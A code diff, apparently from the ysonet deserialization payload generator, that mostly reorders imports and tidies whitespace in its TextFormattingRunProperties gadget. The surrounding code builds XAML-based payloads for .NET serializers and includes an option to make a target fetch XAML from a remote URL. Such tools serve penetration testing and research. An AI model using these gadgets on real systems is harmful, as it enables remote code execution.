@@ -1,13 +1,13 @@
-﻿using System;
-using System.Runtime.Serialization;
-using System.Collections.Generic;
-using Microsoft.VisualStudio.Text.Formatting;
-using ysonet.Helpers;
+﻿using Microsoft.VisualStudio.Text.Formatting;
 using NDesk.Options;
+using System;
+using System.Collections.Generic;
 using System.Collections.Specialized;
 using System.Diagnostics;
 using System.Reflection;
+using System.Runtime.Serialization;
 using System.Windows.Data;
+using ysonet.Helpers;
 
 namespace ysonet.Generators
 {
@@ -24,7 +24,7 @@ namespace ysonet.Generators
         {
             Type typeTFRP = typeof(TextFormattingRunProperties);
             info.SetType(typeTFRP);
-            info.AddValue("ForegroundBrush", _xaml);            
+            info.AddValue("ForegroundBrush", _xaml);
         }
         public TextFormattingRunPropertiesMarshal(string xaml)
         {
@@ -37,11 +37,6 @@ namespace ysonet.Generators
     {
         private string xaml_url = "";
         private bool hasRootDCS = false;
-
-        public override string Name()
-        {
-            return "TextFormattingRunProperties";
-        }
 
         public override string AdditionalInfo()
         {
@@ -60,7 +55,7 @@ namespace ysonet.Generators
 
         public override List<string> Labels()
         {
-            return new List<string> { GadgetTypes.NotBridgeButDervied };
+            return new List<string> { };
         }
 
         public override List<string> SupportedFormatters()
@@ -71,7 +66,7 @@ namespace ysonet.Generators
         public override OptionSet Options()
         {
             OptionSet options = new OptionSet()
-            {                
+            {
                 {"xamlurl=", "This is to create a very short payload when affected box can read the target XAML URL e.g. \"http://b8.ee/x\" (can be a file path on a shared drive or the local system). This is used by the 3rd XAML payload of ObjectDataProvider which is a ResourceDictionary with the Source parameter. Command parameter will be ignored. The shorter the better!", v => xaml_url = v },
                 {"hasRootDCS", "To include a root element with the DataContractSerializer payload.", v => hasRootDCS = v != null },
             };
@@ -140,7 +135,7 @@ namespace ysonet.Generators
             if (xaml_url != "")
             {
                 // this is when it comes from GenerateWithInit 
-                inputArgs.ExtraInternalArguments = new List<String> { "--variant", "3", "--xamlurl", xaml_url};
+                inputArgs.ExtraInternalArguments = new List<String> { "--variant", "3", "--xamlurl", xaml_url };
             }
 
             //SerializersHelper.ShowAll(TextFormattingRunPropertiesGadget(inputArgs));
@@ -153,7 +148,7 @@ namespace ysonet.Generators
             }
             else if (formatter.Equals("NetDataContractSerializer", StringComparison.OrdinalIgnoreCase))
             {
-                string utfString = System.Text.Encoding.UTF8.GetString((byte [])SerializeWithNoTest(TextFormattingRunPropertiesGadget(inputArgs), formatter, inputArgs));
+                string utfString = System.Text.Encoding.UTF8.GetString((byte[])SerializeWithNoTest(TextFormattingRunPropertiesGadget(inputArgs), formatter, inputArgs));
 
                 string payload = SerializersHelper.NetDataContractSerializer_Marshal_2_MainType(utfString);
 
@@ -198,7 +193,7 @@ namespace ysonet.Generators
                 {
                     payload = SerializersHelper.DataContractSerializer_Marshal_2_MainType(SerializersHelper.DataContractSerializer_serialize(TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs)));
                 }
-                
+
 
                 if (inputArgs.Minify)
                 {
@@ -271,7 +266,7 @@ namespace ysonet.Generators
             {
                 throw new Exception("Formatter not supported");
             }
-                
+
         }
 
         /* this can be used easily by the plugins as well */
@@ -297,5 +292,5 @@ namespace ysonet.Generators
             TextFormattingRunPropertiesMarshal payload = new TextFormattingRunPropertiesMarshal(xaml_payload);
             return payload;
         }
-    } 
+    }
 }
